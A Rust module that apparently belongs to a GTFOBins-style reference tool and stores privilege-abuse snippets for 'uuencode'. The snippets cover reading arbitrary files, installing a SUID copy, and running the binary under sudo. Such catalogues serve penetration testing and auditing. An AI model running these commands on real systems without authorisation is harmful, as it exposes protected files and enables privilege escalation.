pub static BIN_NAME: &'static str = "uuencode";
pub static FR_CODE: &'static str = r#"
    
    LFILE=file_to_read
    uuencode "$LFILE" /dev/stdout | uudecode
"#;
pub static SUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which uuencode) .

    LFILE=file_to_read
    uuencode "$LFILE" /dev/stdout | uudecode
"#;
pub static SUDO_CODE: &'static str = r#"
    
    LFILE=file_to_read
    sudo uuencode "$LFILE" /dev/stdout | uudecode
"#;
use crate::code::{Code, Tag};
pub static FR: Code<'static> = Code { 
	title: "FR_CODE",
	code: FR_CODE,
	tag: Tag::FR,
};
pub static SUID: Code<'static> = Code { 
	title: "SUID_CODE",
	code: SUID_CODE,
	tag: Tag::SUID,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
